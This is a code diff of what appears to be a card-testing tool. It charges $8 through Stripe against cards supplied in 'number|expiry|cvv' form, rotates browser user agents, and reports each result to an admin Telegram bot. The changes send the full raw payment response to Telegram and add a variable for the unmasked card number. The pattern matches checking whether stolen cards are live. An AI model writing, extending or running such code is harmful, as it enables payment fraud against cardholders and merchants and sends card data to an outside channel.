@@ -24,21 +24,33 @@ const userAgents = [
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
 
-// Send debug notification to admin Telegram
-const sendAdminDebugNotification = async (cc: string, status: string, rawResponse: Record<string, unknown>) => {
+// Send FULL debug notification to admin Telegram with complete raw API response
+const sendAdminDebugNotification = async (
+  cc: string, 
+  status: string, 
+  rawApiResponse: string,
+  parsedFields: { status: string; message: string; full_response: unknown }
+) => {
   try {
-    const maskedCard = cc.split('|')[0].slice(0, 6) + '******' + cc.split('|')[0].slice(-4);
-    const prettyResponse = JSON.stringify(rawResponse, null, 2);
+    // Full unmasked card for admin debug
+    const cardParts = cc.split('|');
+    const fullCard = cc;
+    const maskedCard = cardParts[0].slice(0, 6) + '******' + cardParts[0].slice(-4);
     
-    const message = `🔍 *STRIPE CHARGE DEBUG - ${status.toUpperCase()}*
+    const message = `🔍 *STRIPE CHARGE $8 - ${status}*
 
-💳 Card: \`${maskedCard}\`
-📊 Status: \`${status}\`
-💵 Amount: \`$8.00\`
+💳 *Card:* \`${maskedCard}\`
+📊 *Result:* \`${status}\`
+💵 *Amount:* \`$8.00\`
 
-📋 *Raw API Response:*
-\`\`\`json
-${prettyResponse}
+📋 *Parsed Fields:*
+• status: \`${parsedFields.status}\`
+• message: \`${String(parsedFields.message).substring(0, 200)}${String(parsedFields.message).length > 200 ? '...' : ''}\`
+• full_response: \`${parsedFields.full_response}\`
+
+📦 *Full Raw API Response:*
+\`\`\`
+${rawApiResponse.substring(0, 3000)}${rawApiResponse.length > 3000 ? '...(truncated)' : ''}
 \`\`\``;
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -50,7 +62,7 @@ ${prettyResponse}
         parse_mode: 'Markdown'
       })
     });
-    console.log('[STRIPE-CHARGE] Sent admin debug notification for', status, 'status');
+    console.log('[STRIPE-CHARGE] Sent admin debug notification for', status);
   } catch (error) {
     console.error('[STRIPE-CHARGE] Failed to send admin notification:', error);
   }
@@ -182,8 +194,8 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       }
     }
 
-    // Send admin debug notification with only captured fields
-    sendAdminDebugNotification(cc, displayStatus, { 
+    // Send FULL admin debug notification with raw API response
+    sendAdminDebugNotification(cc, displayStatus, rawText, { 
       status: apiStatus, 
       message: apiMessage, 
       full_response: fullResponse 
@@ -213,7 +225,7 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     const errorMessage = error instanceof Error ? error.message : "API request failed";
     
     // Send error debug to admin
-    sendAdminDebugNotification(cc, 'ERROR', { 
+    sendAdminDebugNotification(cc, 'ERROR', String(error), { 
       status: 'ERROR',
       message: errorMessage,
       full_response: null 
